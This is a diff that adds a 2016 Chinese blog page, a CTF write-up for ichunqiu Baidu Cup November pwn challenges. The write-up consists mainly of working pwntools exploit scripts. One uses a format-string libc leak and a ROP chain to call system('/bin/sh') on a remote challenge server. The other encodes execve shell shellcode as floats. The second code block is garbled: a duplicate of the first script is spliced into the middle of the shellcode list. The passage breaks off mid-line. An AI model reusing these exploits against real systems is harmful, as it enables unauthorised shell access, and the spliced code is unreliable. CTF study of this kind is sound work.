@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="学习了学习了学习了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ichunqiu百度杯-十一月pwn专题">
+<meta property="og:url" content="https://bestwing.me/ichuqiu-pwn-November.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="学习了学习了学习了">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2016-11-08T08:35:58.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:33:39.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="i春秋-百度杯">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ichunqiu百度杯-十一月pwn专题</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/As-a-Software%20security%20engineer-must-know-and-read-books-recommended.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/Based-on-zio-exp-first-attempt.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/ichuqiu-pwn-November.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/ichuqiu-pwn-November.html&text=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/ichuqiu-pwn-November.html&is_video=false&description=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ichunqiu百度杯-十一月pwn专题&body=Check out this article: https://bestwing.me/ichuqiu-pwn-November.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/ichuqiu-pwn-November.html&name=ichunqiu百度杯-十一月pwn专题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/ichuqiu-pwn-November.html&t=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnme"><span class="toc-number">1.</span> <span class="toc-text">pwnme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#loading"><span class="toc-number">2.</span> <span class="toc-text">loading</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-7z"><span class="toc-number">3.</span> <span class="toc-text">3.7z</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ichunqiu百度杯-十一月pwn专题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2016-11-08T08:35:58.000Z" itemprop="datePublished">2016-11-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/i%E6%98%A5%E7%A7%8B-%E7%99%BE%E5%BA%A6%E6%9D%AF/" rel="tag">i春秋-百度杯</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h1><p>一个溢出题，考点在于怎么去leak出system地址然后去构造rop，最后去getshell，题目整体思路还是很清晰的关键我，我还不会leak</p>
+<p>这个题目还有一个printf的格式化洞，还可以通过这个去写去起shell，不过这种方法比较不优雅<br>学习了学习了 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line">DEBUG = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;106.75.84.74&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># simplified r/s function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delim</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(delim)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rn</span>(<span class="params">count</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvn(count)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ra</span>(<span class="params">count</span>):</span>      <span class="comment"># recv all</span></span><br><span class="line">    buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> count:</span><br><span class="line">        tmp = io.recvn(count)</span><br><span class="line">        buf += tmp</span><br><span class="line">        count -= len(tmp)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sn</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log.info(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">aoti_got = <span class="number">0x601fa8</span></span><br><span class="line">read_got = <span class="number">0x601fb8</span></span><br><span class="line"><span class="comment"># define interactive functions here</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;%37$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    libc_start = int(rn(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">    info(<span class="string">&#x27;libc_start :&#x27;</span> + hex(libc_start))</span><br><span class="line">    </span><br><span class="line">    read_libc = u64(rn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    info(<span class="string">&#x27;read_libc :&#x27;</span> + hex(read_libc))</span><br><span class="line">    system = libc_start - <span class="number">0x7fabbb655a55</span> + <span class="number">0x7fabbb6754f0</span></span><br><span class="line"> <span class="comment">#   e = ELF(&#x27;.bc-64&#x27;)</span></span><br><span class="line">  <span class="comment">#  system = libc_start - e.symbols[&#x27;__libc_start_main&#x27;] + e.symbols[&#x27;system&#x27;]</span></span><br><span class="line">    info(<span class="string">&#x27;system :&#x27;</span> + hex(system))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="number">0x602000</span></span><br><span class="line">    pay = <span class="string">&#x27;0&#x27;</span> * <span class="number">40</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed1</span>) <span class="comment"># pop rsi, r15, ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400730</span>) <span class="comment"># read_got</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(system)</span><br><span class="line">    sn(pay.ljust(<span class="number">0x110</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">    io.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pause()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+
+<h1 id="loading"><a href="#loading" class="headerlink" title="loading"></a>loading</h1><p>这个题目是某PCTF的题  关键的是去构造float 的shellcode<br><a href="https://j31d0.github.io/writeup/2016/04/18/pctf2016-fixedpoint/">writeup</a></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = [<span class="string">&quot;\x31\xc9&quot;</span>, <span class="comment"># xor ecx, ecx</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\x51&quot;</span>, <span class="comment"># push ecx</span></span><br><span class="line">             <span class="string">&quot;\xb1\xff&quot;</span>, <span class="comment"># mov cl, 0xFF</span></span><br><span class="line">             <span class="string">&quot;\xb5\xff&quot;</span>, <span class="comment"># mov ch, 0xFF</span></span><br><span class="line">             <span class="string">&quot;\x41&quot;</span>, <span class="comment"># inc ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x68&quot;</span>, <span class="comment"># mov ah, 0x68</span></span><br><span class="line">             <span class="string">&quot;\xb0\x73&quot;</span>, <span class="comment"># mov al, 0x73</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x2f&quot;</span>, <span class="comment"># mov ah, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\xb0\x2f&quot;</span>, <span class="comment"># mov al, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\x50&quot;</span>, <span class="comment"># push eax</span></span><br><span class="line">             <span class="string">&quot;\xb4\x6e&quot;</span>, <span class="comment"># mov ah, 0x6e</span></span><br><span class="line">             <span class="string">&quot;\xb0\x69&quot;</span>, <span class="comment"># mov al, 0x69</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x62&quot;</span>, <span class="comment"># mov ah, 0x62</span></span><br><span class="line">             <span class="string">&quot;\xb0\x2f&quot;</span>, <span class="comment"># mov al, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\x50&quot;</span>, <span class="comment"># push eax</span></span><br><span class="line">             <span class="string">&quot;\x31\xc0&quot;</span>, <span class="comment"># xor eax, eax#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line">DEBUG = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># simplified r/s function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delim</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(delim)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rn</span>(<span class="params">count</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvn(count)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ra</span>(<span class="params">count</span>):</span>      <span class="comment"># recv all</span></span><br><span class="line">    buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> count:</span><br><span class="line">        tmp = io.recvn(count)</span><br><span class="line">        buf += tmp</span><br><span class="line">        count -= len(tmp)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sn</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log.info(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">aoti_got = <span class="number">0x601fa8</span></span><br><span class="line">read_got = <span class="number">0x601fb8</span></span><br><span class="line"><span class="comment"># define interactive functions here</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;%37$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    libc_start = int(rn(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">    info(<span class="string">&#x27;libc_start :&#x27;</span> + hex(libc_start))</span><br><span class="line">    </span><br><span class="line">    read_libc = u64(rn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    info(<span class="string">&#x27;read_libc :&#x27;</span> + hex(read_libc))</span><br><span class="line">    system = libc_start - <span class="number">0x7fabbb655a55</span> + <span class="number">0x7fabbb6754f0</span></span><br><span class="line"> <span class="comment">#   e = ELF(&#x27;.bc-64&#x27;)</span></span><br><span class="line">  <span class="comment">#  system = libc_start - e.symbols[&#x27;__libc_start_main&#x27;] + e.symbols[&#x27;system&#x27;]</span></span><br><span class="line">    info(<span class="string">&#x27;system :&#x27;</span> + hex(system))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="number">0x602000</span></span><br><span class="line">    pay = <span class="string">&#x27;0&#x27;</span> * <span class="number">40</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed1</span>) <span class="comment"># pop rsi, r15, ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400730</span>) <span class="comment"># read_got</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(system)</span><br><span class="line">    sn(pay.ljust(<span class="number">0x110</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">    io.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pause()</span><br><span class="line">    pwn()</span><br><span class="line">             <span class="string">&quot;\x31\xd2&quot;</span>, <span class="comment"># xor edx, edx</span></span><br><span class="line">             <span class="string">&quot;\x31\xc9&quot;</span>, <span class="comment"># xor ecx, ecx</span></span><br><span class="line">             <span class="string">&quot;\x89\xe3&quot;</span>, <span class="comment"># mov ebx, esp</span></span><br><span class="line">             <span class="string">&quot;\xb0\x0b&quot;</span>, <span class="comment"># mov al, 11</span></span><br><span class="line">             <span class="string">&quot;\xcd\x80&quot;</span>] <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">ints_to_send = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> shellcode:</span><br><span class="line">    z = <span class="string">&quot;\x40&quot;</span></span><br><span class="line">    <span class="keyword">if</span> len(instr) == <span class="number">1</span>:</span><br><span class="line">        z = <span class="string">&quot;\x90\x40&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;\x48&quot;</span> + instr[::<span class="number">-1</span>] + z</span><br><span class="line">    a = struct.unpack(<span class="string">&quot;&gt;f&quot;</span>, payload)[<span class="number">0</span>]*<span class="number">2333</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">2147483647</span>:</span><br><span class="line">        log.error(<span class="string">&quot;It&#x27;s too large fam.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    b = str(<span class="string">&quot;&#123;0:f&#125;&quot;</span>.format(a)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    log.info(b + <span class="string">&quot; &quot;</span> + payload.encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    ints_to_send.append(b)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;106.75.84.68&quot;</span>, 